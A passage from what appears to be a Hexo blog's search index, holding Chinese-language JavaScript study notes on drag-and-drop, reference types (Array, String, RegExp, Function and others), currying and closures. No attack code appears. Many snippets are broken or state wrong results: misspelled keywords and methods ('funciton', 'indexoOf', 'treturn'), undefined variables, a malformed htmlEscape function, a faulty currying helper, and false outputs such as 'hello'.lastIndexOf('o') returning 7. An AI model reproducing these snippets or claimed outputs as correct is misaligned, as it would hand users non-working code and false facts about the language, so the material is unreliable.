dragElements[i].addEventListener(&apos;dragstart&apos;, function(e) &#123; e.dataTransfer.setData(&apos;text&apos;, this.innerHTML); elementDragged = this; &#125;); dragElements[i].addEventListener(&apos;dragend&apos;, function(e) &#123; elementDragged = null; &#125;);&#125;;target.addEventListener(&apos;dragover&apos;, function(e) &#123; e.preventDefault(); e.dataTransfer.dropEffect = &apos;move&apos;; return false;&#125;);target.addEventListener(&apos;drop&apos;, function(e) &#123; e.preventDefault(); e.stopPropagation(); this.innerHTML = &quot;Dropped &quot; + e.dataTransfer.getData(&apos;text&apos;); document.querySelector(&apos;#drag-elements&apos;).removeChild(elementDragged); return false;&#125;);]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS引用类型]]></title>
    <url>%2FJS%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B.html</url>
    <content type="text"><![CDATA[定义引用类型的值（对象）是引用类型的一个实例。引用类型是一种数据结构，用于将数据和功能组织在一起。 Object类型创建方式：使用new操作符后跟Object构造函数。123var person = new Object(); //与 var person = &#123;&#125; 等同person.name = &quot;Nicholas&quot;;person.age = 29; 使用对象字面量表示法。1234var person = &#123; name : &quot;Nicholas&quot;, age : 29 //在最后一个属性后面添加逗号，会在IE7及更早版本的Opera中导致错误&#125; 访问属性：使用点表示法：1alert(person.name); 使用方括号语法：1alert(person[&quot;name&quot;]); 使用方括号访问的优点： 可以通过变量来访问 如果属性名中包含会导致错误语法的字符，或使用关键字，保留字，可以用方括号 除非必须使用变量来访问属性，否则我们建议使用点表示法。 Array类型特点：ECMAScript数组的每一项可以保存在任何类型的数据ECMAScript数组的大小是可以动态调整的 创建方式：使用Array构造函数12var colors = new Array(3);var colors = new Array(&quot;Greg&quot;); 使用数组字面量1var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;]; 读取方式和设置数组：123var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];alert(colors[[0]]);colors[2] = &quot;black&quot;; 检测数组：1if(Array.isArray(value))&#123;&#125; 转换方法：123456var colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];alert(colors.toString()); //red,blue,greenalert(colors.valueOf()); //red,blue,greenalert(colors); //red,blue,greenalert(colors.join(&quot;,&quot;)); //red,blue,greenalert(colors.join(&quot;||&quot;)); //red||blue||green 栈方法：栈是一种LIFO(Last-In-First-Out)的数据结构1234567var colors = new Array();var count = colors.push(&quot;red&quot;,&quot;green&quot;);alert(count); //2count = colors.push(&quot;black&quot;);alert(count); //3var item = colors.pop();alert(item); //&quot;black&quot; 队列方法：队列是一种FIFO(First-in-First-Out)的数据结构12345678910111213var colors = new Array();var count = colors.push(&quot;red&quot;,&quot;green&quot;);alert(count); //2count = colors.push(&quot;black&quot;);alert(count); //3var item = colors.shift();alert(item); //redvar colors = new Array();var count = colors.unshift(&quot;red&quot;,&quot;green&quot;);count = colors.unshift(&quot;black&quot;);alert(colors); //black,red,greenvar item = colors.pop();alert(item); //green 重排序方法：function reverse:123var values= [1,2,3,4,5];values.reverse();alert(values); //5,4,3,2,1 function sort:在执行sort方法前，会先调用toString()转型，然后比较得到字符串123var values = [0,1,5,10,15];values.sort();alert(values); //0,1,10,15,5 添加比较函数，如果第一个参数应该位于第二个参数前，返回负数，否则返回正数。123456789101112function compare(value1,value2)&#123; if(value1 &lt; value2)&#123; return -1; &#125; else if(value1 &gt; value2)&#123; return 1; &#125; else&#123; return 0; &#125;&#125;values.sort(compare); //0,1,5,10,15 数值类型可以用更简单的比较函数123function compare(value1,value2)&#123; //升序 return value1 - value2;&#125; 操作方法：function concat:1234var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;];var colors = colors.concat(&quot;yellow&quot;,[&quot;black&quot;,&quot;brown&quot;]);alert(colors); //red,green,bluealert(colors2); //red,green,blue,yellow,black,brown 这个方法会先创建当前数组的一个副本，然后将接收的参数添加到这个副本的末尾，最后返回新构建的数组 function slice:12345var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;,&quot;yellow&quot;,&quot;purple&quot;];var colors2 = colors.slice(1);var colors3 = colors.slice(1,4);alert(colors2); //green,blue,yellow,purplealert(colors3); //green,blue,yellow 能够基于当前数组中的一或多个项创建一个新数组，slice方法不会影响原始数组 function splice:删除、插入、替换，用于向数组中部插入项12345678910var colors = [&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;];var removed = colors.splice(0,1); //删除一项alert(colors); //green,bluealert(removed); //redremoved = colors.splice(1,0,&quot;yellow&quot;,&quot;orange&quot;); //插入两项alert(colors); //green,yellow,orange,bluealert(removed); //空数组removed = colors.splice(1,1,&quot;red&quot;,&quot;purple&quot;); //替换一项，插入一项alert(colors); //green,red,purple,orange,bluealert(removed); //yellow 位置方法：function indexOf:从数组的开头开始向后查找，比较时会使用全等操作符12345678var numbers = [1,2,3,4,5,4,3,2,1];alert(numbers.indexoOf(4)); //3alert(numbers.indexOf(4,4)) //第一参数表示要查找的项，第二参数表示查找起始位置var person = &#123;name:&quot;Nicholas&quot;&#125;;var people = [&#123;name:&quot;Nicholas&quot;&#125;];var morePeople = [person];alert(people.indexOf(person)); //-1alert(morePeople.indexOf(person)); //0 function lastIndexOf:从数组的末尾开始向前查找123var numbers = [1,2,3,4,5,4,3,2,1];alert(numbers.lastIndexOf(4)); //5alert(numbers.lastIndexOf(4,4)); //3 迭代方法：function every:对数组中的每一项运行给定函数，如果该函数对每一项都返回true，则返回true12345var numbers = [1,2,3,4,5,4,3,2,1];var everyResult = numbers.every(function(item,index,array)&#123; return (item&gt;2);&#125;);alert(everyResult); //false function filter:对数组中的每一项运行给定函数，返回该函数会返回true的项组成的数组12345var numbers = [1,2,3,4,5,4,3,2,1];var filterResult = numbers.filter(function(item,index,array)&#123; return (item&gt;2);&#125;);alert(filterResult); //[3,4,5,4,3] function forEach:对数组中的每一项运行给定函数，这个方法没有返回值1234var numbers = [1,2,3,4,5,4,3,2,1];var filterResult = numbers.filter(function(item,index,array)&#123; //...&#125;); function map:对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组12345var numbers = [1,2,3,4,5,4,3,2,1];var mapResult = numbers.map(function(item,index,array)&#123; return item*2;&#125;);alert(mapResult); //[2,4,6,8,10,8,6,4,2] function some:对数组中的每一项运行给定函数，如果该函数对任一项返回true，则返回true12345var numbers = [1,2,3,4,5,4,3,2,1];var someResult = numbers.some(function(item,index,array)&#123; return (item&gt;2);&#125;);alert(someResult); //true 缩小方法（归并方法）：function reduce:接收4个参数：前一个值，当前值，项的索引值和数组对象，这个函数中返回的任何值都会作为第一个参数自动传给下一项12345var values = [1,2,3,4,5];var sum - values.reduce(function(prev,cur,index,array)&#123; return prev + cur;&#125;);alert(sum); //15 function reduceRight:与reduce相似，只是从数组最后一项开始，向前遍历12345var values = [1,2,3,4,5];var sum = values.reduceRight(function(prev,cur,index,array)&#123; return prev + cur;&#125;);alert(sum); //15 Date类型构造函数：1234var nom = new Date();var now = new Date.parse(&quot;YYYY-MM-DD&quot;); //2019-02-19var now = new Date(Date.UTC(2015,4,5,17,55,55)); //2015/4/5 17:55:55var start = Date.now(); //获取毫秒数 继承方法：不同浏览器对toLocaleString(),toString()和valueOf()方法解释不同 日期格式化方法：toDateString()：以特定于实现的格式显示星期几、月、日和年toTimeString()：以特定于实现的格式显示时分秒和时区toLocaleDateString()：以特定于地区的格式显示星期几、日、月、年toLocaleTimeString()：以特定于地区的格式显示时分秒toUTCString()：以特定于实现的格式完整的UTC日期 日期/时间组件方法：getTime()：返回表示日期的毫秒数getFullyYear()：取得4位数的年份getMonth()：返回日期中的月份，0-11表示1月至12月getDate()：返回日期月份中的天数(1-31)getDay()：返回日期中星期的星期几(0-6)表示，星期日至星期六getHours()：返回日期中的小时数(0-23) RegExp类型基础语法：1var expression = /pattern/flags; pattern部分：可以是任何简单或复杂的正则表达式flags部分：每个正则表达式都可带有1或多个标志 g：表示全局模式，即模式将被应用于所有字符串i：标识区分大小写模式，即在确定匹配项时忽略模式与字符串的大小写m：表示多行模式，即在到达一行文本末尾时还会继续查找下一行是否存在与模式匹配的项 与其他语言中的正则表达式类似，模式中使用的所有元字符都必须转义:([(\^$|)?*+.])12var pattern = /[bc]at/i;var pattern2 = new RegExp(&quot;[bc]at&quot;,&quot;i&quot;); 在ECMAScript中，正则表达式字面量始终会共享同一个RegExp实例，而使用构造函数创建的每一个新RegExp实例都是一个新实例 RegExp实例属性：global：布尔值，表示是否设置了g标志ignoreCase：布尔值，表示是否设置了i标志lastIndex：整数，表示开始搜索下一个匹配项的字符位置，从0算起multiline：布尔值，表示是否设置了m标志source：正则表达式的字符串表示，按照字面量形式而传入构造函数中的字符串模式返回123456var pattern1 = /\[bc\]at/i;alert(pattern1.global); //falsealert(pattern1.ignoreCase); //truealert(pattern1.multiline); //falsealert(pattern1.lastIndex); //0alert(pattern1.source); //&quot;\[bc\]at&quot; RegExp实例方法：function exec:专门为捕获组而设计，返回包含第一个匹配信息的数组12345678var text = &quot;mom and dad and baby&quot;;var pattern = /mom(and dad(and baby)?)?/gi;var matches = pattern.exec(text);alert(matches.index); //0alert(matches.input); //&quot;mom and dad and baby&quot;alert(matches[0]); //&quot;mom and dad and baby&quot;alert(matches[1]); //&quot;and dad and baby&quot;alert(matches[2]); //&quot;and baby&quot; function test:接受一个字符串参数，在模式与该参数匹配的情况下返回true，否则，返回false12345var text = &quot;000-000-0000&quot;;var pattern = /\d&#123;3&#125;-\d&#123;2&#125;-\d&#123;4&#125;/;if(pattern.test(text))&#123; alert(&quot;The pattern was matched&quot;);&#125; function toLocaleString()和toString():返回正则表达式的字面量，与创建正则表达式的方式无关 构造函数属性：input：返回最近一次要匹配的字符串leftContext：返回input字符串中lastMatch之前的文本lastMatch：返回最近一次的匹配项lastParen：返回最近一次匹配的捕获组multiline：布尔值，表示是否所有表达式都是用多行模式rightContext：input字符串中lastMatch之后的文本123456789var text = &quot;this has been a short summer&quot;;var patern = /(:)hort/g;if(pattern.test(text))&#123; alert(RegExp.input); //this has been a short summer alert(RegExp.rightContext); //this has been a alert(RegExp.lastMatch); //short alert(RegExp.lastParen); //s alert(RegExp.multiline); //false&#125; 模式的局限性：ECMAScript不支持的特性： 匹配字符串开始和结尾的\A和\Z锚向后查找并集和交集类原子组Unicode支持命名的捕获组s(single，单行)和x(free-spacing，无间隔)匹配模式条件匹配正则表达式注释 Function类型定义方式：123456function sum(num1,num2)&#123; return num1 + num2;&#125;var sum = function(num1,num2)&#123; return num1 + num2;&#125; 没有重载：1234567function addNumber(num)&#123; return num + 100;&#125;funciton addNumber(num)&#123; return num + 200;&#125;var result = addNumber(100); //300 函数声明与函数表达式：解析器会率先读取函数声明，并使其在执行任何代码之前可用1234alert(sum(0,10));function sum(num1,num2)&#123; return num1 + num2;&#125; 作为值的函数：可以像传递参数一样把一个函数传递给另一个函数12345678910111213function callSomeFunction(someFunction,someArgument)&#123; return someFunction(someArgument);&#125;function add10(num)&#123; return num + 10;&#125;function greeting(name)&#123; return &quot;Hello &quot; + name;&#125;var result = callSomeFunction(add10,10);alert(result); //20var result2 = callSomeFunction(greeting,&quot;Van&quot;);alert(result2); //&quot;Hello Van&quot; 可以将一个函数作为另一个函数的结果返回12345678910111213function createComparisonFunction(propertyName)&#123; return function (object1,object2)&#123; var value1 = object1[propertyName]; var value2 = object2[propertyName]; if(value1 &lt; value2)&#123; return -1; &#125;else if(value1 &gt; value2)&#123; return 1; &#125;else&#123; return 0; &#125; &#125;&#125; 函数内部属性：callee:一个指针，指向拥有这个arguments对象的函数1234567891011121314151617//函数执行与函数名&quot;factorial&quot;紧耦合在一起function factorial(num)&#123; if(num &lt;= 1)&#123; return 1; &#125;else&#123; return num * factorial(num-1); &#125;&#125;//无论函数取什么名字都能正常递归function factorial(num)&#123; if(num &lt;= 1)&#123; return 1; &#125;else&#123; return num * arguments.callee(num-1); &#125;&#125; this：引用函数当前执行的环境对象12345678window.color = &quot;red&quot;;var o = &#123;color:&quot;blue&quot;&#125;;function sayColor()&#123; alert(this.color);&#125;sayColor(); //&quot;red&quot;，this为全局对象o.sayColor = sayColor;alert(0.sayColor()); //&quot;blue&quot;，this为对象o caller:ES5引入，保存调用当前函数的函数引用，如果实在全局调用，其值为null1234567function outer()&#123; inner();&#125;function inner()&#123; alert(inner.caller); //可解耦合写成alert(arguments.callee.caller)&#125;outer(); //outer 函数的属性和方法：length属性:表示函数希望接收的命名参数个数123456function sayName(name)&#123;&#125;function sum(num1,num2)&#123;&#125;function sayHi()&#123;&#125;alert(sayName.length); //1alert(sum.length); //2alert(sayHi.length); //0 prototype属性:保存它们所有实例方法的真正所在 function apply:在特定的作用域中调用函数123456789function sum(num1,num2)&#123; return num1 + num2;&#125;function callSum1(num1,num2)&#123; return sum.apply(this,arguments);&#125;function callSum2(num1,num2)&#123; return sum.apply(this,[num1,num2]);&#125; function apply:与apply方法的作用相同，区别在于除了第一个参数this,其余参数都须直接传给函数123456function sum(num1,num2)&#123; return num1 + num2;&#125;function callSum(num1,num2)&#123; return sum.call(this,num1,num2);&#125; apply()和call()真正强大是能够扩充函数赖以运行的作用域123456789window.color = &quot;red&quot;;var o = &#123;color:&quot;blue&quot;&#125;;function sayColor()&#123; alert(this.color);&#125;sayColor(); //&quot;red&quot;sayColor.call(this); //&quot;red&quot;sayColor.call(window); //&quot;red&quot;sayColor.call(o); //&quot;blue&quot; 用这种方法来扩充作用域对象不需要与方法有任何耦合关系 基本包装类型Boolean类型：123456var falseObject = new Boolean(false);var result = falseObjet &amp;&amp; true;alert(result); //truevar falseValue = false;result = falseValue &amp;&amp; true;alert(result); //false Number类型：Number类型重写了valueOf,toLocalString和toString方法12345var num = 10;alert(num.toString()); //&quot;10&quot;，默认十进制表示alert(num.toString(2)); //&quot;1010&quot;，二进制表示alert(num.toFixed(2)); //&quot;10.00&quot;，按照指定小数位返回alert(num.toExponential(1)); //&quot;1.0e+1&quot;，按照指定位数返回指数表示法 String类型：字符方法：123var stringValue = &quot;hello world&quot;;alert(stringValue.charAt(1)); //&quot;e&quot;alert(stringValue.charCodeAt(1)); //&quot;101&quot;,小写字母e字符编码 字符串操作方法：123456789101112131415161718192021var stringValue = &quot;hello&quot;;var result = stringValue.concat(&quot; world&quot;,&quot;!&quot;); //返回新字符串alert(result); //&quot;hello world!&quot;alert(stringValue); //&quot;hello&quot;var stringValue = &quot;hello world&quot;;alert(stringValue.slice(3)); //&quot;lo world&quot;alert(stringValue.subString(3)); //&quot;lo world&quot;alert(stringValue.subStr(3)); //&quot;lo world&quot;alert(stringValue.slice(3,7)); //&quot;lo w&quot;，起始位置，结束位置alert(stringValue.subString(3,7)); //&quot;lo w&quot;，同上alert(stringValue.subStr(3,7)); //&quot;lo worl&quot;，起始位置，返回字符个数alert(stringValue.slice(-3)); //&quot;rld&quot;alert(stringValue.subString(-3)); //&quot;hello world&quot;，把所有负数转换成0alert(stringValue.subStr(-3)); //&quot;rld&quot;，负数加上数组长度alert(stringValue.slice(3,-4)); //&quot;lo w&quot;alert(stringValue.subString(3,-4)); //&quot;hel&quot;，把负数变成0，从小的开始alert(stringValue.subStr(3,-4)); //&quot; &quot;，把负数变成0 字符串位置方法：123var stringValue = &quot;hello&quot;;alert(stringValue.indexOd(&quot;o&quot;)); //4alert(stringValue.lastIndexOf(&quot;o&quot;)); //7 可以通过循环调用，来找到所有匹配的子字符串12345678var stringValue = &quot;Lorem ipsum color sit amet, consectetur adipisicing elit&quot;;var positions = new Array();var pos = stringValue.indexOf(&quot;e&quot;);while(pos&gt;-1)&#123; positions.push(pos); pos = stringValue.indexOf(&quot;e&quot;,pos+1);&#125;alert(positions); //&quot;3,24,32,35,52&quot; trim方法：喊出前置和后缀的所有空格1234var stringValue = &quot; hello world&quot;;var trimedString = stringValue.trim();alert(stringValue); //&quot; hello world&quot;alert(trimedString); //&quot;hello world&quot; 字符串大小写转换方法：12345var stringValue = &quot;hello world&quot;;alert(stringValue.toLocaleUpperCase()); //&quot;HELLO WORLD&quot;alert(stringValue.toUpperCase()); //&quot;HELLO WORLD&quot;alert(stringValue.toLocaleLowerCase()); //&quot;hello world&quot;alert(stringValue.toLowerCase()); //&quot;hello world&quot; 字符串模式匹配方法：1234567891011121314var text = &quot;cat,bat,sat,fat&quot;;var pattern = /.at/;//与pattern.exec()相同var matches = text.match(pattern);alert(matches.index); //0alert(matches[0]); //&quot;cat&quot;，返回第一个匹配的字符串alert(pattern.lastIndex); //0var pos = text.search(/at/);alert(pos); //1，返回第一个匹配项的索引，没有找到则返回-1var result = text.replace(&quot;at&quot;,&quot;ond&quot;); //只替换第一个子字符串alert(result); //&quot;cond,bat,sat,fat&quot;result = text.replace(/at/g,&quot;ond&quot;);alert(result); //&quot;cond,bond,sond,fond&quot; 使用replace第二个参数，可以实现更加精细的替换1234567891011121314function htmlEscape(text)&#123; return text.replace(/[&lt;&gt;&quot;&amp;]/g,function(match,pos,orignalText))&#123; switch(match)&#123; case &quot;&lt;&quot;: return &quot;&amp;lt&quot;; case &quot;&gt;&quot;: return &quot;&amp;gt&quot;; case &quot;&amp;&quot;: return &quot;&amp;amp&quot;; case &quot;\&quot;&quot;: return &quot;&amp;quot&quot;; &#125; &#125;&#125; split方法：1234var colorText = &quot;red,blue,green,yellow&quot;;var colors1 = colorText.split(&quot;,&quot;); //[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;,&quot;yellow&quot;]var colors2 = colorText.split(&quot;,&quot;,2); //[&quot;red&quot;,&quot;blue&quot;]，只包含两项var colors2 = colorText.split(/[^\,]t/); //[&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;] LocaleCompare方法：比较两个字符串，如果字符串在字母表中应该排在字符串参数之前，则返回负数，排在之后，则返回一个正数，等于则返回01234var stringValue = &quot;yellow&quot;;alert(stringValue.localeCompare(&quot;black&quot;)); //1alert(stringValue.localeCompare(&quot;yellow&quot;)); //0alert(stringValue.localeCompare(&quot;zoo&quot;)); //1 fromCharCode方法：接收一或多个字符编码，将它们转换成一个字符串1alert(String.fromCharCode(104,101,108,108,111)); //&quot;hello&quot; 单体内置对象开发人员不必显示的实例化内置对象 Global对象URI编码方法12345var uri = &quot;http://www.wrox.com/illegal.value.html#start&quot;;alert(encodeURI(url); //https://www.wrox.com/illegal%20value.html#startalert(encodeURIComponent(url)); //https%3A%2F%2Fwww.wrox.com%2Fillegal%20value.html%23start encodeURI不会对URI本身进行编码12345var uri2 = &quot;https%3A%2F%2Fwww.wrox.com%2Fillegal%20value.html%23start&quot;;alert(decodeURI(uri)); //https%3A%2F%2Fwww.wrox.com%2Fillegal%20value.html%23startalert(decodeURIComponent(uri));//https://www.wrox.com/illegal%20value.html#start decodeURI只能对encodeURI转换后的字符进行解码，而decodeURIComponent会将所有特殊字符解码 eval方法通过eval执行的代码被认为是包含该次调用的执行环境的一部分，因此被执行的代码具有与该执行环境相同的作用域链12var msg = &quot;hello world&quot;;eval(&quot;alert(msg)&quot;); //&quot;hello world&quot; window对象12345var color = &quot;red&quot;;function sayColor()&#123; alert(window.color);&#125;window.sayColor(); //&quot;red&quot; Math对象min和max方法1234var max = Math.max(3,54,32,16);alert(max); //54var min = Math.min(3,54,32,16);alert(min); //3 可以使用apply方法12var values = [1,2,3,4,5,6,7,8];var max = Math.max.apply(Math,values); 四舍五入方法123alert(Math.ceil(25.9)); //总是将数值向上舍入为最近的整数，26alert(Math.floor(25.9)); //总是将数值向下舍入为最近的整数，25alert(Math.round(25.9)); //四舍五入为最近的整数，26 random方法值：Math.floor(Math.random()*可能的值的总数+第一个可能的值)1var num = Math.floor(Math.random()*9+2); //返回2-10的值]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数柯里化]]></title>
    <url>%2F%E5%87%BD%E6%95%B0%E6%9F%AF%E9%87%8C%E5%8C%96.html</url>
    <content type="text"><![CDATA[老是听大佬们口中谈及函数柯里化，在没有了解之前，我一直认为这是一个十分高深的东西，然而在接触后也深深被他的魅力吸引，那么究竟什么是柯里化？柯里化又有什么好处？作为一个前端工程狮，这是你必须掌握的高级技能。 什么是柯里化(Currying)柯里化是把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数且返回结果的新函数的技术。也就是将具有多个元的函数转化为具有较少元的函数。 来看下面的例子1234567891011121314function add(a,b,c)&#123; return a + b + c;&#125;function curryingAdd(a)&#123; return function(b)&#123; return function(c)&#123; return a + b + c; &#125; &#125;&#125;add(1,2,3); //3 curryingAdd(1)(2)(3); //3 Currying的核心思想柯里化的核心思想就是降低通用性，提高适用性。举个例子说明12Ajax(&quot;get&quot;,&quot;url&quot;,&quot;data&quot;);Ajaxget(&quot;url&quot;,&quot;data&quot;); 上述代码中，Ajax是一个通用性的方法，而Ajaxget是一个只针对get请求的方法，从性能上来看，通用性的方法需要对请求的类型进行判断，而通过调用Ajaxget可以减少判断，同时我们可以直接从api上得知请求的类型，对于后期的开发维护也有帮助。 Currying的特点 参数复用：如果是相同的参数，在计算之后不需要再次重新传参计算 提前返回：多次调用多次内部判断，可以直接把第一次判断的结果返回外部接受 延迟执行：避免重复执行程序，等真正需要结果的时候，再执行 参数复用12345678910111213function curryingAdd(a)&#123; return function(b)&#123; return function(c)&#123; return a + b + c; &#125; &#125;&#125;var add1 = curryingAdd(1);var add2 = add1(2);console.log(add2(3));console.log(add2(4)); 还是以刚才的例子做说明，通过复用参数，我们可以实现空间换时间，在调用add2进行计算时，实际上只进行了一次计算。 提前返回1234567891011121314var addEvent = function(el, type, fn, capture)&#123; if(window.addEventListener)&#123; el.addEventListener(type, function()&#123; &#125;); &#125; else if(window.attachEvent)&#123; el.attachEvent(); &#125;&#125;addEvent(div,click,callback,false); //判断一次addEvent(p,click,callback,false); //判断二次addEvent(span,click,callback,false); //判断三次 上述代码是兼容浏览器添加事件的一段常用的代码，但在使用中，会多次进行浏览器版本的判断，而浏览器的版本在打开浏览器的时候就已经确定，重复的判断反而会降低使用性能，所以可以利用柯里化思想对上述代码进行下面的改进。 12345678910111213141516171819var addEvent = function()&#123; if(window.addEventListener)&#123; return function(el, type, fn, capture)&#123; el.addEventListener(type, function()&#123;&#125;); &#125;; &#125; else if(window.attachEvent)&#123; return function(el, type, fn, capture)&#123; el.attachEvent(); &#125; &#125;&#125;//只判断一次var addEvent_new = addEventaddEvent_new(div,click,callback,false); addEvent_new(p,click,callback,false); addEvent_new(span,click,callback,false); 延迟执行1234567891011121314151617181920212223var curryScore = function(fn)&#123; var _allScore = []; //存放分数 return function()&#123; if(arguments.length === 0)&#123; return fn.apply(null,_allScore); //对象冒充，形实转换 &#125; _allScorll = _allScore.concat([].slice.call(arguments)); &#125;&#125;var allScore = 0;var addScore = curryScore(function()&#123; for(var i = 0; i &lt; arguments.length; i++)&#123; allScore +=arguments[i]; &#125;&#125;);addScore(2);addScore(3);addScore(3);addScore(2);addScore(1);addScore(); //11 上述代码的思想就是先把传入的参数都保存起来，当达到某个延迟条件时，进行输出。 通用封装方法1234567891011121314151617181920// 支持多参数传递function progressCurrying(fn, args) &#123; var _this = this var len = fn.length; var args = args || []; return function() &#123; var _args = Array.prototype.slice.call(arguments); Array.prototype.push.apply(args, _args); // 如果参数个数小于最初的fn.length，则递归调用，继续收集参数 if (_args.length &lt; len) &#123; return progressCurrying.call(_this, fn, _args); &#125; // 参数收集完毕，则执行fn return fn.apply(this, _args); &#125;&#125; Currying的性能开销虽然柯里化提高了函数的适用性，但是它还是会产生一些性能的开销。 存取arguments对象通常要比存取命名参数要慢一点 一些老版本的浏览器在arguments.length的实现上是相当慢的 使用fn.apply() 和 fn.call()通常比直接调用fn()稍微慢点 创建大量嵌套作用域和闭包函数会带来花销，无论是在内存还是速度上 但性能的主要瓶颈在操作DOM结点的开销，Currying这部分性能损耗基本可以忽略不计。 经典柯里化面试题12345678910111213141516171819202122232425262728// 实现一个add方法，使计算结果能够满足如下预期：add(1)(2)(3) = 6;add(1, 2, 3)(4) = 10;add(1)(2)(3)(4)(5) = 15;function add() &#123; // 第一次执行时，定义一个数组专门用来存储所有的参数 var _args = Array.prototype.slice.call(arguments); // 在内部声明一个函数，利用闭包的特性保存_args并收集所有的参数值 var _adder = function() &#123; _args.push(...arguments); return _adder; &#125;; // 利用toString隐式转换的特性，当最后执行时隐式转换，并计算最终的值返回 _adder.toString = function () &#123; return _args.reduce(function (a, b) &#123; return a + b; &#125;); &#125; return _adder;&#125;add(1)(2)(3) // 6add(1, 2, 3)(4) // 10add(1)(2)(3)(4)(5) // 15add(2, 6)(1) // 9]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS函数表达式（闭包）]]></title>
    <url>%2FJS%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E9%97%AD%E5%8C%85%EF%BC%89.html</url>
    <content type="text"><![CDATA[基础函数声明和函数表达式函数声明：重要特征是函数声明提升，在执行代码之前会先读取函数声明。1234sayHi();function sayHi()&#123; alert(&quot;Hi&quot;);&#125; 函数表达式（匿名函数）：匿名函数的name属性是空字符串，有时也称函数拉姆达函数。123var sayHi = function()&#123; alert(&quot;Hi&quot;);&#125;; 递归使用arguments.callee指向正在执行的函数指针，可以实现对函数的递归调用，且比直接使用函数名更加安全。1234567function facorial(num)&#123; if(num &lt;= 1)&#123; return 1; &#125; else &#123; return num * arguments.callee(num-1); //使之与函数名解耦合 &#125;&#125; 以上方法在严格模式下会出错，在严格模式下，可使用命名函数表达式达成相同的结果。1234567var factorial = (function f(num)&#123; if(num &lt;= 1)&#123; return 1; &#125; else &#123; return num * f(num-1); &#125;&#125;); 闭包基础闭包是指有权访问另一个函数作用域中的变量的函数。12345678910111213function createComparesonFuncion(popertyName)&#123; return function(object1,object2)&#123; var value1 = object1[propertyName]; var value2 = object2[propertyName]; if(value1 &lt; value2)&#123; return -1; &#125; else if(value1 &gt; value2)&#123; return 1; &#125; else &#123; return 0; &#125; &#125;;&#125; 一般当函数执行完毕后，局部活动对象就会被销毁，内存中仅保存全局作用域，但闭包不同，在另一个函数内部定义的函数会将包含函数（即外部函数）的活动对象加到它的作用域链中。1234\\创建函数var compareName = createComparesonFunction(&quot;name&quot;);var result = compareNames(&#123;name:&quot;Nicholas&quot;&#125;,&#123;name:&quot;Greg&quot;&#125;); //调用函数compareNames = null; //解除对匿名函数的引用 闭包与变量闭包只能取得包含函数中任何变量的最后一个值，因为闭包保存的是整个变量对象，而不是某个特殊变量。123456789function createFunctions()&#123; var result = new Array(); for(var i = 0; i &lt; 10; i++)&#123; result[i] = function() &#123; return i; //每次返回都为10 &#125;; &#125; return result;&#125; 以上代码，通过匿名函数强制让闭包行为符合预期。1234567891011function createFunctions()&#123; var result = new Array(); for(var i = 0; i &lt; 10; i++)&#123; result[i] = function(num) &#123; //使用匿名函数，则立即执行匿名函数 return function(num)&#123; return num; &#125;; &#125;(i); //值传递，把i赋值给num &#125; return result;&#125; this对象匿名函数的执行环节具有全局性，因此其this对象通常指向window。12345678910var name = &quot;The window&quot;;var object = &#123; name : &quot;MyObject&quot;, getNameFunc ： function()&#123; return function()&#123; return this.name; &#125; &#125;&#125;;alert(object.getNameFunc()()); //&quot;The window&quot; 每个函数在调用时都会自动取得两个特殊变量this和arguments内部函数只会搜索到其活动对象为止，所以不能直接访问外部函数中的这两个变量。 可以通过把外部作用域中的this对象保存在闭包能访问到的变量里，让闭包访问。1234567891011var name = &quot;The window&quot;;var object = &#123; name : &quot;MyObject&quot;; getNameFunc : function()&#123; var that = this; return function()&#123; return that.name; &#125;; &#125;&#125;;alert(object.getNameFunc()()); //&quot;MyObject&quot; 特殊情况，this值可能会意外地改变。12345678910var name = &quot;The window&quot;;var object = &#123; name : &quot;MyObject&quot;; getName : function()&#123; treturn this.name; &#125;&#125;;object.getName(); //&quot;MyObject&quot;(object.getName)(); //&quot;MyObject&quot;,相当于引用了一个函数，this得到了维持(object.getName = object.getName)(); //&quot;The window&quot;，this值不能得到维持 内存泄漏1234567//该闭包导致element的引用数无法减少，element不会被回收function assignHandler()&#123; var element = document.getElementById(&quot;someElement&quot;); element.onlick = function()&#123; alert(element.id); &#125;&#125; 模仿块级作用域JavaScript没有块级作用域的概念12345678fucntion outputNumbers(count)&#123; for(var i = 0; i &lt; count; i++)&#123; alert(i); &#125; var i; //重新声明变量也不会改变它的值 alert(i); //count值，从i定义开始，就可以在函数内部随处访问 //而在Java，c++中，变量i只会在for循环的语句块中有定义&#125; 可以用匿名函数来模仿块级作用域1234567(function()&#123; //这里是块级作用域&#125;)(); //定义并立即调用了一个匿名函数，括号表示它实际上是一个函数表达式var someFunction = function()&#123; //这里是块级作用域&#125;;someFunction(); JavaScript将function当作一个函数声明的开始，而函数声明后面不能跟圆括号，而函数表达式可以。12345678function outputNumber(count)&#123; (function()&#123; for(var i = 0; i &lt; count; i++)&#123; alert(i); &#125; &#125;)(); alert(i); //出错&#125; 私有作用域的i在执行结束后被销毁，私有作用域能访问count，因为其为闭包 私有变量123456789101112function MyObject()&#123; //私有变量和私有函数 var privateVariable = 10; function privateFunction()&#123; return false; &#125; //特权方法 this.publicMethod = function()&#123; privateVariable ++; return privateFunction(); &#125;&#125; 利用私有和特权成员，可以隐藏那些不应该被直接修改的数据123456789101112funcion Person(name)&#123; this.getName = function()&#123; return name; &#125;; this.setName = funcion(value)&#123; name = value; &#125;;&#125;var person = new Person(&quot;Nicholas&quot;);alert(person.getName()); 